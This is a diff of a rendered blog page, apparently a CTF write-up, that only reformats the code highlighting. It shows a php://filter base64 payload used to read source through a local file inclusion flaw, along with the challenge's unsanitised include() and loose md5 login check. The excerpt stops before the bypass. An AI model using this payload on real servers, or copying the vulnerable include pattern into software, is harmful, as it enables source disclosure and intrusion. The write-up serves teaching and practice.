@@ -70,56 +70,105 @@ login.php
 flag.php
 </pre></table></code></div></div><p>And we come to the conclusion about this endpoint is simply a LFI/RFI gold-mine for us to abuse as the value of <code class="language-plaintext highlighter-rouge">page</code> is not being sanitized at all.</p><p>In case you are not aware of LFI/RFI, you can <a href="https://en.wikipedia.org/wiki/File_inclusion_vulnerability">read about it here</a>.</p><p>Since the webpage standard is not to include PHP objects as plain code, we have to wrap it up using any encoding types (base64). So our final payload would be as follow:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 </pre><td class="rouge-code"><pre>http://p2n.000webhostapp.com/log_me_in/index.php?page=php://filter/convert.base64-encode/resource=index.php
-</pre></table></code></div></div><p>Using Burp Suite to prettified the output:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/6.png?raw=true" alt="image-20210224115215060" style="zoom:150%;" /></p><p>Decode the base64 buffer will let us have the PHP source of <code class="language-plaintext highlighter-rouge">index.php</code></p><pre><code class="language-php+HTML">&lt;?php
-if (isset($_GET['page'])) {
-	$page = $_GET['page'];
+</pre></table></code></div></div><p>Using Burp Suite to prettified the output:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://github.com/legiahuyy/image-host/blob/main/2021-2-24-RFI-Wrapper/6.png?raw=true" alt="image-20210224115215060" style="zoom:150%;" /></p><p>Decode the base64 buffer will let us have the PHP source of <code class="language-plaintext highlighter-rouge">index.php</code></p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]))</span> <span class="p">{</span>
+	<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
 	
-	if (preg_match("/flag/i", $page))
-		die("&lt;h1&gt;Not so ez =))). Let's think another way!!! &lt;/h1&gt;");
+	<span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">"/flag/i"</span><span class="p">,</span> <span class="nv">$page</span><span class="p">))</span>
+		<span class="k">die</span><span class="p">(</span><span class="s2">"&lt;h1&gt;Not so ez =))). Let's think another way!!! &lt;/h1&gt;"</span><span class="p">);</span>
 
-	include($_GET['page'].'.php');
-}
-else {
-	header('Location: ?page=login');
-}
-?&gt;
-</code></pre><p>Do the same with <code class="language-plaintext highlighter-rouge">login.php</code> and grab the source</p><pre><code class="language-php+HTML">&lt;?php
-include("flag.php");
+	<span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'.php'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span> <span class="p">{</span>
+	<span class="nb">header</span><span class="p">(</span><span class="s1">'Location: ?page=login'</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Do the same with <code class="language-plaintext highlighter-rouge">login.php</code> and grab the source</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"flag.php"</span><span class="p">);</span>
 
-if (isset($_POST['usr']) &amp;&amp; isset($_POST['pwd']) ) {
-	$your_username = $_POST['usr'];
-	$your_password = $_POST['pwd'];
+<span class="k">if</span> <span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'usr'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pwd'</span><span class="p">])</span> <span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$your_username</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'usr'</span><span class="p">];</span>
+	<span class="nv">$your_password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pwd'</span><span class="p">];</span>
 
-	if ($your_username === "admin" &amp;&amp; md5($your_password) == md5("NOOPCJF") &amp;&amp; $your_password !== "NOOPCJF" )
-		echo "Hello admin!! Here your flag: ".$flag;
-	else
-		die("Something went wrong!!!");
-}
-?&gt;
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$your_username</span> <span class="o">===</span> <span class="s2">"admin"</span> <span class="o">&amp;&amp;</span> <span class="nb">md5</span><span class="p">(</span><span class="nv">$your_password</span><span class="p">)</span> <span class="o">==</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"NOOPCJF"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$your_password</span> <span class="o">!==</span> <span class="s2">"NOOPCJF"</span> <span class="p">)</span>
+		<span class="k">echo</span> <span class="s2">"Hello admin!! Here your flag: "</span><span class="mf">.</span><span class="nv">$flag</span><span class="p">;</span>
+	<span class="k">else</span>
+		<span class="k">die</span><span class="p">(</span><span class="s2">"Something went wrong!!!"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
 
 
-&lt;!DOCTYPE html&gt;
-&lt;html lang="en"&gt;
-&lt;head&gt;
-	&lt;meta charset="UTF-8"&gt;
-	&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
-	&lt;title&gt;Login page&lt;/title&gt;
-&lt;/head&gt;
-&lt;body&gt;
-	&lt;h1&gt;Login form&lt;/h1&gt;
-	&lt;form action="?page=login" method="POST"&gt;
-		&lt;label for="usr"&gt; Username &lt;/label&gt;
-		&lt;input type="text" name="usr" required /&gt; &lt;br&gt;
+<span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1.0"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;title&gt;</span>Login page<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+	<span class="nt">&lt;h1&gt;</span>Login form<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"?page=login"</span> <span class="na">method=</span><span class="s">"POST"</span><span class="nt">&gt;</span>
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"usr"</span><span class="nt">&gt;</span> Username <span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"usr"</span> <span class="na">required</span> <span class="nt">/&gt;</span> <span class="nt">&lt;br&gt;</span>
 
-		&lt;label for="pwd"&gt; Password &lt;/label&gt;
-		&lt;input type="text" name="pwd" required /&gt; &lt;br&gt;
+		<span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"pwd"</span><span class="nt">&gt;</span> Password <span class="nt">&lt;/label&gt;</span>
+		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"pwd"</span> <span class="na">required</span> <span class="nt">/&gt;</span> <span class="nt">&lt;br&gt;</span>
 
-		&lt;input type="submit" value="submit"&gt;
-	&lt;/form&gt;
-&lt;/body&gt;
-&lt;/html&gt;
+		<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;/form&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 
-</code></pre><p>Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></table></code></div></div><p>Now we want to look at the IF statement as it provides us the valid credentials to achieve our flag</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
